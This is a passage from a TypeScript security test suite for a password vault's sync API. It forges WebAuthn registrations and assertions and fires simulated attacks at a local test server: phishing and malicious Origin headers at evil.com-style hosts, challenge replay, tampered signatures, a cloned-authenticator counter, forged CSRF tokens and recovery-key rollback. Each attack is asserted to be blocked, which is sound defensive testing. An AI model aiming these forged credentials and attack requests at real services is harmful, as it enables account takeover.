import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import express from 'express';
import { isoBase64URL, isoCBOR } from '@simplewebauthn/server/helpers';
import { createSyncApiRouter } from '../server/syncRoutes.ts';
import { resetRateLimitsForTests } from '../middleware/auth.ts';
import {
  inspectRawDatabaseStateForTest,
  setSimulateNextDbFailure,
} from '../db/repository.ts';
import { CryptoEngine } from '../services/CryptoEngine.ts';
import { DeviceSecurityModel } from '../services/DeviceSecurityModel.ts';
import { StorageService } from '../services/StorageService.ts';
import { SyncAdapter } from '../services/SyncAdapter.ts';
import { createSampleSpringFieldPayload } from './seedData.ts';
import type { Argon2Params, CredentialItem, SecretNote } from '../types/vault.ts';

const TEST_KDF_PARAMS: Argon2Params = {
  t: 1,
  m: 4096,
  p: 1,
  dkLen: 32,
};

async function withLiveSecurityServer(
  fn: (baseUrl: string) => Promise<void>
): Promise<void> {
  resetRateLimitsForTests();
  const app = express();
  app.use(express.json({ limit: '2mb' }));
  app.use('/api/v1', createSyncApiRouter());

  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const addr = server.address();
  if (!addr || typeof addr === 'string') {
    server.close();
    throw new Error('Falha ao alocar porta para servidor de testes Fase 5A.');
  }
  const baseUrl = `http://127.0.0.1:${addr.port}`;
  try {
    await fn(baseUrl);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

/**
 * Constrói um autenticador FIDO2 / WebAuthn real baseado em ECDSA P-256 (ES256)
 * para testar criptograficamente `@simplewebauthn/server` (attestation + assertion + counter + UV/UP).
 */
function createHardwareAuthenticatorSimulator(rpId: string, origin: string) {
  const { privateKey, publicKey } = generateKeyPairSync('ec', {
    namedCurve: 'P-256',
  });
  const jwk = publicKey.export({ format: 'jwk' });
  const x = Buffer.from(jwk.x!, 'base64url');
  const y = Buffer.from(jwk.y!, 'base64url');

  // COSE Key Map (kty=2 EC2, alg=-7 ES256, crv=1 P-256, x=-2, y=-3)
  const coseMap = new Map<number, number | Uint8Array>([
    [1, 2],
    [3, -7],
    [-1, 1],
    [-2, new Uint8Array(x)],
    [-3, new Uint8Array(y)],
  ]);
  const cosePublicKey = isoCBOR.encode(coseMap);
  const credentialIdBuf = Buffer.from(
    CryptoEngine.randomId('passkey-cred'),
    'utf-8'
  );
  const credentialIdB64Url = isoBase64URL.fromBuffer(credentialIdBuf);
  const rpIdHash = createHash('sha256').update(rpId).digest();

  return {
    credentialIdB64Url,
    buildRegistrationResponse(
      challengeB64Url: string,
      opts?: { customOrigin?: string; customRpId?: string; uv?: boolean; counter?: number }
    ) {
      const targetRpHash = opts?.customRpId
        ? createHash('sha256').update(opts.customRpId).digest()
        : rpIdHash;
      const uvBit = opts?.uv === false ? 0x00 : 0x04;
      const flags = Buffer.from([0x01 | uvBit | 0x40]); // UP(0x01) | UV(0x04) | AT(0x40)
      const cnt = Buffer.alloc(4);
      cnt.writeUInt32BE(opts?.counter ?? 1, 0);
      const aaguid = Buffer.alloc(16, 0);
      const credLen = Buffer.alloc(2);
      credLen.writeUInt16BE(credentialIdBuf.length, 0);

      const authData = Buffer.concat([
        targetRpHash,
        flags,
        cnt,
        aaguid,
        credLen,
        credentialIdBuf,
        Buffer.from(cosePublicKey),
      ]);

      const attObj = isoCBOR.encode(
        new Map<string, string | Uint8Array | Map<string, string>>([
          ['fmt', 'none'],
          ['attStmt', new Map<string, string>()],
          ['authData', new Uint8Array(authData)],
        ])
      );

      const clientDataJSON = Buffer.from(
        JSON.stringify({
          type: 'webauthn.create',
          challenge: challengeB64Url,
          origin: opts?.customOrigin || origin,
          crossOrigin: false,
        })
      );

      return {
        id: credentialIdB64Url,
        rawId: credentialIdB64Url,
        type: 'public-key' as const,
        clientExtensionResults: {},
        response: {
          attestationObject: isoBase64URL.fromBuffer(attObj),
          clientDataJSON: isoBase64URL.fromBuffer(clientDataJSON),
          transports: ['internal'],
        },
      };
    },
    buildAssertionResponse(
      challengeB64Url: string,
      counterValue: number,
      opts?: { customOrigin?: string; tamperSignature?: boolean; uv?: boolean }
    ) {
      const uvBit = opts?.uv === false ? 0x00 : 0x04;
      const flags = Buffer.from([0x01 | uvBit]);
      const cnt = Buffer.alloc(4);
      cnt.writeUInt32BE(counterValue, 0);
      const authData = Buffer.concat([rpIdHash, flags, cnt]);

      const clientDataJSON = Buffer.from(
        JSON.stringify({
          type: 'webauthn.get',
          challenge: challengeB64Url,
          origin: opts?.customOrigin || origin,
          crossOrigin: false,
        })
      );
      const clientDataHash = createHash('sha256').update(clientDataJSON).digest();
      const sigBase = Buffer.concat([authData, clientDataHash]);
      const derSig = sign('sha256', sigBase, privateKey);
      if (opts?.tamperSignature) {
        derSig[derSig.length - 1] ^= 0xff;
      }

      return {
        id: credentialIdB64Url,
        rawId: credentialIdB64Url,
        type: 'public-key' as const,
        clientExtensionResults: {},
        response: {
          authenticatorData: isoBase64URL.fromBuffer(authData),
          clientDataJSON: isoBase64URL.fromBuffer(clientDataJSON),
          signature: isoBase64URL.fromBuffer(derSig),
        },
      };
    },
  };
}

// ============================================================================
// 1. AUDITORIA DE AUTENTICAÇÃO WEBAUTHN COMPLETA + BLOQUEIO EM CONTA ALHEIA (§1)
// ============================================================================
test('Fase 5A - 01 (§1): WebAuthn Passkeys com @simplewebauthn/server, assinatura ECDSA P-256, Challenge único anti-replay, Origin/RP ID, Counter anti-clone e bloqueio de registro em conta alheia', async () => {
  await withLiveSecurityServer(async (baseUrl) => {
    const parsedUrl = new URL(baseUrl);
    const rpId = parsedUrl.hostname;
    const expectedOrigin = parsedUrl.origin;
    const victimUid = CryptoEngine.randomId('usr-barnaby-5a');
    const attackerUid = CryptoEngine.randomId('usr-burns-5a');

    // 1. Gera opções de registro de Passkey para a conta legítima
    const optRes = await fetch(`${baseUrl}/api/v1/auth/webauthn/register/options`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Origin: expectedOrigin,
      },
      body: JSON.stringify({
        userUid: victimUid,
        email: `${victimUid}@donutvault.local`,
        rpId,
        origin: expectedOrigin,
      }),
    });
    assert.equal(optRes.status, 200);
    const optData = await optRes.json();
    assert.ok(optData.challengeId);
    assert.ok(optData.options.challenge);

    const fidoKey = createHardwareAuthenticatorSimulator(rpId, expectedOrigin);

    // 2. Verifica rejeição quando Origin é falsa/phishing
    const optPhishRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/register/options`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: expectedOrigin },
        body: JSON.stringify({
          userUid: victimUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    const optPhishData = await optPhishRes.json();
    const phishAttestation = fidoKey.buildRegistrationResponse(
      optPhishData.options.challenge,
      { customOrigin: 'https://phishing-springfield.evil.com' }
    );
    const phishVerifyRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/register/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: optPhishData.challengeId,
          registrationResponse: phishAttestation,
        }),
      }
    );
    assert.equal(
      phishVerifyRes.status,
      401,
      'Deve rejeitar registro WebAuthn com Origin falsa (401)'
    );

    // 3. Registra Passkey legítima com UV=true e UP=true
    const validAttestation = fidoKey.buildRegistrationResponse(
      optData.options.challenge,
      { counter: 1 }
    );
    const regVerifyRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/register/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: optData.challengeId,
          deviceName: 'YubiKey Setor 7G',
          platform: 'desktop-web',
          registrationResponse: validAttestation,
        }),
      }
    );
    assert.equal(regVerifyRes.status, 201);
    const regVerifiedData = await regVerifyRes.json();
    assert.equal(regVerifiedData.verified, true);
    assert.ok(regVerifiedData.sessionToken.startsWith('dvlt_sess_'));
    assert.ok(regVerifiedData.csrfToken.startsWith('dvlt_csrf_'));

    // 4. Ataque de Replay: tenta reutilizar o mesmo challengeId já consumido
    const replayRegRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/register/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: optData.challengeId,
          registrationResponse: validAttestation,
        }),
      }
    );
    assert.equal(replayRegRes.status, 401);
    const replayBody = await replayRegRes.json();
    assert.match(replayBody.error, /Replay bloqueado/i);

    // 5. Tentativa de invasor não autenticado registrar Passkey ou Dispositivo na conta existente de victimUid -> 403 Forbidden!
    const roguePasskeyOptRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/register/options`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    assert.equal(
      roguePasskeyOptRes.status,
      403,
      'Invasor sem sessão não pode iniciar cadastro de Passkey em conta existente alheia (403)'
    );

    const rogueDeviceRegRes = await fetch(
      `${baseUrl}/api/v1/auth/devices/register`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          deviceName: 'Celular Espião Sr. Burns',
          platform: 'mobile-web',
          // Sem pedir checagem estrita: o servidor exige posse da conta por padrão.
          authMethod: 'session-token',
        }),
      }
    );
    assert.equal(
      rogueDeviceRegRes.status,
      403,
      'Invasor não autenticado não pode registrar dispositivo em conta existente alheia (403)'
    );

    // 6. Autenticação WebAuthn com verificação criptográfica de assinatura ECDSA P-256
    const authOptRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/options`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    assert.equal(authOptRes.status, 200);
    const authOptData = await authOptRes.json();

    // 6A. Tenta autenticar com assinatura adulterada -> 401 Unauthorized
    const tamperedAssertion = fidoKey.buildAssertionResponse(
      authOptData.options.challenge,
      2,
      { tamperSignature: true }
    );
    const tamperedAuthRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: authOptData.challengeId,
          authenticationResponse: tamperedAssertion,
        }),
      }
    );
    assert.equal(
      tamperedAuthRes.status,
      401,
      'Assinatura ECDSA adulterada deve ser rejeitada (401)'
    );

    // 6B. Solicita novo challenge (pois o anterior foi consumido) e autentica com assinatura válida (counter = 2)
    const authOpt2Res = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/options`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    const authOpt2Data = await authOpt2Res.json();
    const validAssertion = fidoKey.buildAssertionResponse(
      authOpt2Data.options.challenge,
      2
    );
    const validAuthRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: authOpt2Data.challengeId,
          deviceName: 'MacBook Setor 7G Autenticado',
          platform: 'desktop-web',
          authenticationResponse: validAssertion,
        }),
      }
    );
    assert.equal(validAuthRes.status, 200);
    const validAuthData = await validAuthRes.json();
    assert.equal(validAuthData.verified, true);

    // 6C. Teste Anti-Clone de Autenticador: tenta autenticar com counter regressivo (counter = 1 <= 2) -> 401!
    const authOpt3Res = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/options`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    const authOpt3Data = await authOpt3Res.json();
    const clonedAssertion = fidoKey.buildAssertionResponse(
      authOpt3Data.options.challenge,
      1 // counter regressivo!
    );
    const clonedAuthRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: victimUid,
          challengeId: authOpt3Data.challengeId,
          authenticationResponse: clonedAssertion,
        }),
      }
    );
    assert.equal(
      clonedAuthRes.status,
      401,
      'Contador WebAuthn regressivo (autenticador clonado) deve ser bloqueado (401)'
    );

    // 6D. Tentativa de usar a Passkey de victimUid para autenticar na conta de attackerUid -> 403 Forbidden
    const attackerChallengeRes = await fetch(
      `${baseUrl}/api/v1/auth/passkey/challenge`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: attackerUid,
          rpId,
          origin: expectedOrigin,
        }),
      }
    );
    const attackerChallenge = await attackerChallengeRes.json();
    const crossAccountAssertion = fidoKey.buildAssertionResponse(
      attackerChallenge.challengeHex,
      3
    );
    const crossAccountRes = await fetch(
      `${baseUrl}/api/v1/auth/webauthn/authenticate/verify`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userUid: attackerUid,
          challengeId: attackerChallenge.challengeId,
          authenticationResponse: crossAccountAssertion,
        }),
      }
    );
    assert.equal(
      crossAccountRes.status,
      403,
      'Passkey vinculada a outra conta deve ser rejeitada com 403 Forbidden'
    );
  });
});

// ============================================================================
// 2. PROTEÇÃO DE SESSÕES, COOKIES HTTPONLY, ANTI-CSRF E SSE SEM TOKEN NA URL (§2)
// ============================================================================
test('Fase 5A - 02 (§2): Proibição de token em URL no SSE (400), Cookies HttpOnly/SameSite=Strict, Proteção CSRF (403), Expiração de Sessão (401) e Encerramento SSE no Logout/Revogação', async () => {
  await withLiveSecurityServer(async (baseUrl) => {
    const userUid = CryptoEngine.randomId('usr-sse-csrf-5a');
    const otherUid = CryptoEngine.randomId('usr-other-sse-5a');
    const vaultId = CryptoEngine.randomId('vault-sse-5a');
    const sync = new SyncAdapter();

    // 1. Registra dispositivo e verifica emissão de Cookies HttpOnly + SameSite=Strict + csrfToken
    const rawRegRes = await fetch(`${baseUrl}/api/v1/auth/devices/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userUid,
        email: `${userUid}@donutvault.local`,
        deviceName: 'Desktop Cookie & CSRF Guard',
        platform: 'desktop-web',
        authMethod: 'webauthn-passkey',
      }),
    });
    assert.equal(rawRegRes.status, 201);
    const setCookieHeader = rawRegRes.headers.get('set-cookie') || '';
    assert.match(setCookieHeader, /dvlt_sid=/);
    assert.match(setCookieHeader, /HttpOnly/i);
    assert.match(setCookieHeader, /SameSite=Strict/i);

    const regData = await rawRegRes.json();
    const sessionToken: string = regData.sessionToken;
    const csrfToken: string = regData.csrfToken;
    const deviceId: string = regData.device.deviceId;
    const cookieHeader = `dvlt_sid=${encodeURIComponent(sessionToken)}; dvlt_did=${encodeURIComponent(deviceId)}`;

    // Registra o cofre para o usuário
    await sync.registerVaultOnBackend(
      baseUrl,
      { userUid, deviceId, sessionToken },
      {
        vaultId,
        activeKeyEpoch: 1,
        kdfParams: TEST_KDF_PARAMS,
        saltHex: 'aa'.repeat(16),
        wrappedDekHex: 'bb'.repeat(32),
        dekNonceHex: 'cc'.repeat(12),
      }
    );

    // 2. TESTE DE SEGURANÇA SSE: Tentar enviar token de sessão na URL deve ser bloqueado com 400 Bad Request!
    const badSseUrlRes = await fetch(
      `${baseUrl}/api/v1/sync/events?vaultId=${vaultId}&deviceId=${deviceId}&token=${sessionToken}`
    );
    assert.equal(
      badSseUrlRes.status,
      400,
      'Tokens de sessão persistentes em parâmetros de URL no SSE devem ser bloqueados com 400 Bad Request!'
    );
    const badSseBody = await badSseUrlRes.json();
    assert.match(badSseBody.error, /proibido enviar tokens de sessão persistentes em parâmetros de URL/i);

    // 3. TESTE DE ISOLAMENTO DE USUÁRIO NO SSE: Outro usuário tentando escutar o vaultId de userUid -> 403 Forbidden
    const otherReg = await sync.registerDeviceOnBackend(baseUrl, {
      userUid: otherUid,
      email: `${otherUid}@donutvault.local`,
      deviceName: 'Aparelho Intruso SSE',
      platform: 'mobile-web',
      authMethod: 'session-token',
    });
    const crossSseRes = await fetch(
      `${baseUrl}/api/v1/sync/events?vaultId=${vaultId}`,
      {
        headers: {
          Cookie: `dvlt_sid=${encodeURIComponent(otherReg.sessionToken)}; dvlt_did=${encodeURIComponent(otherReg.device.deviceId)}`,
        },
      }
    );
    assert.equal(
      crossSseRes.status,
      403,
      'Usuário B não pode conectar ao stream SSE do cofre do Usuário A (403 Forbidden)'
    );

    // 4. TESTE DE CONEXÃO SSE AUTENTICADA POR COOKIE HTTPONLY (Sem token na URL!)
    const abortCtrl = new AbortController();
    const validSseRes = await fetch(
      `${baseUrl}/api/v1/sync/events?vaultId=${vaultId}`,
      {
        headers: { Cookie: cookieHeader },
        signal: abortCtrl.signal,
      }
    );
    assert.equal(validSseRes.status, 200);
    assert.match(validSseRes.headers.get('content-type') || '', /text\/event-stream/);
    abortCtrl.abort();

    // 5. TESTES DE PROTEÇÃO ANTI-CSRF EM SESSÃO BASEADA EM COOKIE HTTPONLY
    // 5A. POST autenticado por Cookie sem cabeçalho X-CSRF-Token -> 403 Forbidden
    const csrfMissingRes = await fetch(`${baseUrl}/api/v1/sync/push`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookieHeader,
      },
      body: JSON.stringify({ vaultId, operations: [] }),
    });
    assert.equal(
      csrfMissingRes.status,
      403,
      'Requisição POST autenticada por Cookie sem X-CSRF-Token deve ser bloqueada (403)'
    );

    // 5B. POST autenticado por Cookie com X-CSRF-Token inválido -> 403 Forbidden
    const csrfWrongRes = await fetch(`${baseUrl}/api/v1/sync/push`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookieHeader,
        'X-CSRF-Token': 'dvlt_csrf_forged_invalid_token',
      },
      body: JSON.stringify({ vaultId, operations: [] }),
    });
    assert.equal(
      csrfWrongRes.status,
      403,
      'Token X-CSRF-Token inválido deve ser bloqueado (403)'
    );

    // 5C. POST com Sec-Fetch-Site: cross-site -> 403 Forbidden
    const crossSiteFetchRes = await fetch(`${baseUrl}/api/v1/sync/push`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookieHeader,
        'X-CSRF-Token': csrfToken,
        'Sec-Fetch-Site': 'cross-site',
      },
      body: JSON.stringify({ vaultId, operations: [] }),
    });
    assert.equal(
      crossSiteFetchRes.status,
      403,
      'Requisição cross-site deve ser bloqueada pelo filtro CSRF (403)'
    );

    // 5D. POST com Origin divergente do Host -> 403 Forbidden
    const badOriginRes = await fetch(`${baseUrl}/api/v1/sync/push`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookieHeader,
        'X-CSRF-Token': csrfToken,
        Origin: 'https://evil-csrf-attacker.com',
      },
      body: JSON.stringify({ vaultId, operations: [] }),
    });
    assert.equal(
      badOriginRes.status,
      403,
      'Requisição com Origin maliciosa deve ser bloqueada (403)'
    );

    // 5E. POST autenticado por Cookie + X-CSRF-Token legítimo -> 200 OK
    const csrfValidRes = await fetch(`${baseUrl}/api/v1/sync/push`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: cookieHeader,
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify({ vaultId, operations: [] }),
    });
    assert.equal(
      csrfValidRes.status,
      200,
      'Requisição autenticada por Cookie HttpOnly + X-CSRF-Token válido deve ser aceita (200)'
    );

    // 6. TESTE DE SESSÃO EXPIRADA (ttlMs negativo) -> 401 Unauthorized
    // Pareamento por cabeçalho cria um aparelho à parte; pelo cookie, o servidor renovaria a sessão
    // deste mesmo navegador.
    const expiredRegRes = await fetch(
      `${baseUrl}/api/v1/auth/devices/register`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${sessionToken}`,
          'X-Device-Id': deviceId,
        },
        body: JSON.stringify({
          userUid,
          deviceName: 'Sessão Temporária Expirada',
          platform: 'mobile-web',
          authMethod: 'session-token',
          ttlMs: -10_000, // Já nasce expirada
        }),
      }
    );
    const expiredRegData = await expiredRegRes.json();
    const expiredPullRes = await fetch(
      `${baseUrl}/api/v1/sync/pull?vaultId=${vaultId}&sinceCursor=0`,
      {
        headers: {
          Authorization: `Bearer ${expiredRegData.sessionToken}`,
          'X-Device-Id': expiredRegData.device.deviceId,
        },
      }
    );
    assert.equal(
      expiredPullRes.status,
      401,
      'Sessão expirada deve ser imediatamente rejeitada com 401 Unauthorized'
    );

    // 7. TESTE DE LOGOUT EXPLÍCITO E INVALIDAÇÃO DE REUSO DE TOKEN / SSE
    const logoutRes = await fetch(`${baseUrl}/api/v1/auth/logout`, {
      method: 'POST',
      headers: {
        Cookie: cookieHeader,
        'X-CSRF-Token': csrfToken,
      },
    });
    assert.equal(logoutRes.status, 200);

    // Tenta reutilizar o token após logout -> 401 Unauthorized
    const reuseAfterLogoutRes = await fetch(
      `${baseUrl}/api/v1/sync/pull?vaultId=${vaultId}&sinceCursor=0`,
      {
        headers: {
          Authorization: `Bearer ${sessionToken}`,
          'X-Device-Id': deviceId,
        },
      }
    );
    assert.equal(
      reuseAfterLogoutRes.status,
      401,
      'Token de sessão não pode ser reutilizado após Logout (401)'
    );

    // Tenta abrir SSE após logout -> 401 Unauthorized
    const sseAfterLogoutRes = await fetch(
      `${baseUrl}/api/v1/sync/events?vaultId=${vaultId}`,
      {
        headers: { Cookie: cookieHeader },
      }
    );
    assert.equal(
      sseAfterLogoutRes.status,
      401,
      'SSE deve rejeitar conexão após Logout/Revogação (401)'
    );
  });
});

// ============================================================================
// 3. VALIDAÇÃO CRIPTOGRÁFICA DO KIT DE EMERGÊNCIA, RECUPERAÇÃO EM NOVO APARELHO
//    SEM O APARELHO ORIGINAL E POLÍTICA DE SUBSTITUIÇÃO/REVOGAÇÃO (§3, §5-F, §7)
// ============================================================================
test('Fase 5A - 03 (§3 & §5-F): Recuperação criptográfica real da DEK com Chave de Recuperação Independente de 256 bits em dispositivo totalmente novo + Rotação e Revogação da Chave de Recuperação', async () => {
  await withLiveSecurityServer(async (baseUrl) => {
    const userUid = CryptoEngine.randomId('usr-recovery-5a');
    const sample = createSampleSpringFieldPayload();
    const { container, sessionDek: originalDek } =
      await CryptoEngine.sealContainerV2(
        'SenhaMestraQueSeraEsquecida!2026',
        sample,
        TEST_KDF_PARAMS
      );

    const primarySync = new SyncAdapter();
    const regPrimary = await primarySync.registerDeviceOnBackend(baseUrl, {
      userUid,
      email: `${userUid}@donutvault.local`,
      deviceName: 'PC Principal (Que Será Perdido)',
      platform: 'desktop-web',
      authMethod: 'webauthn-passkey',
    });
    const primaryAuth = {
      userUid,
      deviceId: regPrimary.device.deviceId,
      sessionToken: regPrimary.sessionToken,
    };

    await primarySync.registerVaultOnBackend(baseUrl, primaryAuth, {
      vaultId: container.vaultId,
      activeKeyEpoch: container.keyEpoch,
      kdfParams: container.kdfParams,
      saltHex: container.saltHex,
      wrappedDekHex: container.wrappedDekHex,
      dekNonceHex: container.dekNonceHex,
    });

    for (const rec of container.records) {
      primarySync.enqueueRecordOperation(rec, 0);
    }
    await primarySync.flushOfflineQueueToBackend(
      baseUrl,
      primaryAuth,
      container.vaultId,
      originalDek,
      container.keyEpoch
    );

    // 1. Gera Kit de Emergência Criptográfico Verificado (v1) com Chave de Recuperação de 256 bits (DVLT-REC-...)
    const kitV1 =
      await DeviceSecurityModel.generateVerifiedCryptographicEmergencyKit({
        sessionDek: originalDek,
        vaultId: container.vaultId,
        accountIdentifier: `${userUid}@donutvault.local`,
        keyEpoch: container.keyEpoch,
        recoveryKeyVersion: 1,
        kdfProfile: TEST_KDF_PARAMS,
      });

    assert.ok(kitV1.recoveryKey?.startsWith('DVLT-REC-'));
    assert.ok(kitV1.recoveryMetadata);
    assert.notEqual(
      kitV1.recoveryKey,
      kitV1.secretKey,
      'A Recovery Key independente (256 bits) jamais deve se confundir com a Secret Key 2FA (128 bits)'
    );

    // Sem o verificador da prova de posse o servidor recusa o pacote (sem ele, ninguém recuperaria).
    const saveWithoutVerifierRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${primaryAuth.sessionToken}`,
          'X-Device-Id': primaryAuth.deviceId,
        },
        body: JSON.stringify({
          vaultId: container.vaultId,
          recoveryKeyVersion: kitV1.recoveryMetadata.recoveryKeyVersion,
          recoverySaltHex: kitV1.recoveryMetadata.recoverySaltHex,
          recoveryWrappedDekHex: kitV1.recoveryMetadata.recoveryWrappedDekHex,
          recoveryDekNonceHex: kitV1.recoveryMetadata.recoveryDekNonceHex,
          recoveryKeyCommitmentSha256:
            kitV1.recoveryMetadata.recoveryKeyCommitmentSha256,
        }),
      }
    );
    assert.equal(saveWithoutVerifierRes.status, 400);

    // Salva apenas os metadados públicos do encapsulamento de recuperação no PostgreSQL
    const saveRecV1Res = await fetch(`${baseUrl}/api/v1/sync/vault/recovery`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${primaryAuth.sessionToken}`,
        'X-Device-Id': primaryAuth.deviceId,
      },
      body: JSON.stringify({
        vaultId: container.vaultId,
        recoveryKeyVersion: kitV1.recoveryMetadata.recoveryKeyVersion,
        recoverySaltHex: kitV1.recoveryMetadata.recoverySaltHex,
        recoveryWrappedDekHex: kitV1.recoveryMetadata.recoveryWrappedDekHex,
        recoveryDekNonceHex: kitV1.recoveryMetadata.recoveryDekNonceHex,
        recoveryKeyCommitmentSha256:
          kitV1.recoveryMetadata.recoveryKeyCommitmentSha256,
        recoveryAuthVerifierSha256:
          kitV1.recoveryMetadata.recoveryAuthVerifierSha256,
      }),
    });
    assert.equal(saveRecV1Res.status, 200);

    // 2. POLÍTICA DE SUBSTITUIÇÃO (ROTAÇÃO) DA CHAVE DE RECUPERAÇÃO:
    // O usuário gera um novo Kit de Emergência (v2), invalidando imediatamente o Kit v1 anterior!
    const kitV2 =
      await DeviceSecurityModel.generateVerifiedCryptographicEmergencyKit({
        sessionDek: originalDek,
        vaultId: container.vaultId,
        accountIdentifier: `${userUid}@donutvault.local`,
        keyEpoch: container.keyEpoch,
        recoveryKeyVersion: 2,
        kdfProfile: TEST_KDF_PARAMS,
      });
    assert.ok(kitV2.recoveryKey && kitV2.recoveryMetadata);

    const saveRecV2Res = await fetch(`${baseUrl}/api/v1/sync/vault/recovery`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${primaryAuth.sessionToken}`,
        'X-Device-Id': primaryAuth.deviceId,
      },
      body: JSON.stringify({
        vaultId: container.vaultId,
        recoveryKeyVersion: 2,
        recoverySaltHex: kitV2.recoveryMetadata.recoverySaltHex,
        recoveryWrappedDekHex: kitV2.recoveryMetadata.recoveryWrappedDekHex,
        recoveryDekNonceHex: kitV2.recoveryMetadata.recoveryDekNonceHex,
        recoveryKeyCommitmentSha256:
          kitV2.recoveryMetadata.recoveryKeyCommitmentSha256,
        recoveryAuthVerifierSha256:
          kitV2.recoveryMetadata.recoveryAuthVerifierSha256,
      }),
    });
    assert.equal(saveRecV2Res.status, 200);

    // Tentativa de Rollback da versão da chave de recuperação (v2 -> v1) -> 409 Conflict
    const rollbackRecRes = await fetch(`${baseUrl}/api/v1/sync/vault/recovery`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${primaryAuth.sessionToken}`,
        'X-Device-Id': primaryAuth.deviceId,
      },
      body: JSON.stringify({
        vaultId: container.vaultId,
        recoveryKeyVersion: 1,
        recoverySaltHex: kitV1.recoveryMetadata.recoverySaltHex,
        recoveryWrappedDekHex: kitV1.recoveryMetadata.recoveryWrappedDekHex,
        recoveryDekNonceHex: kitV1.recoveryMetadata.recoveryDekNonceHex,
        recoveryKeyCommitmentSha256:
          kitV1.recoveryMetadata.recoveryKeyCommitmentSha256,
        recoveryAuthVerifierSha256:
          kitV1.recoveryMetadata.recoveryAuthVerifierSha256,
      }),
    });
    assert.equal(
      rollbackRecRes.status,
      409,
      'Não deve permitir regredir recoveryKeyVersion (409 Conflict)'
    );

    // Destrói a DEK do dispositivo original (simulando perda física do PC e esquecimento da Senha Mestra!)
    CryptoEngine.zeroize(originalDek);

    // 3. Tentativa de recuperar usando o Kit v1 substituído -> 401 Unauthorized
    const staleBundleRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery/bundle`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          vaultId: container.vaultId,
          recoveryAuthToken: CryptoEngine.deriveRecoveryAuthToken(
            kitV1.recoveryKey!,
            container.vaultId,
            1
          ),
          deviceName: 'Tentativa com Kit v1 Antigo',
          platform: 'mobile-web',
        }),
      }
    );
    assert.equal(
      staleBundleRes.status,
      401,
      'Kit de Emergência v1 antigo não deve ser aceito após substituição pelo v2 (401)'
    );

    // 3B. O compromisso fica guardado no servidor, então quem leu o banco o conhece. Ele não pode
    // servir de prova: só o token derivado da Chave de Recuperação abre o pacote.
    const commitmentAsProofRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery/bundle`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          vaultId: container.vaultId,
          recoveryAuthToken: kitV2.recoveryMetadata.recoveryKeyCommitmentSha256,
          deviceName: 'Quem leu o banco',
          platform: 'desktop-web',
        }),
      }
    );
    assert.equal(
      commitmentAsProofRes.status,
      401,
